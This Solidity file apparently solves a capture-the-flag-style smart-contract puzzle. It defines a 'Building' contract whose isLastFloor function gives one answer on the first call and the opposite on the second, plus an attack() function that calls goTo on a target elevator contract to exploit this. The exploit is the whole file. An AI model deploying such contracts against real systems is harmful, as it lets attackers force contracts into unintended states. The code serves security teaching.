// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract Building {
    bool public isTop = false;

    function isLastFloor(uint256) external returns (bool) {
        if (isTop == false) {
            isTop = true;
            return false;
        } else {
            return true;
        }
    }

    function attack(address target) external {
        Elevator(target).goTo(1);
    }
}
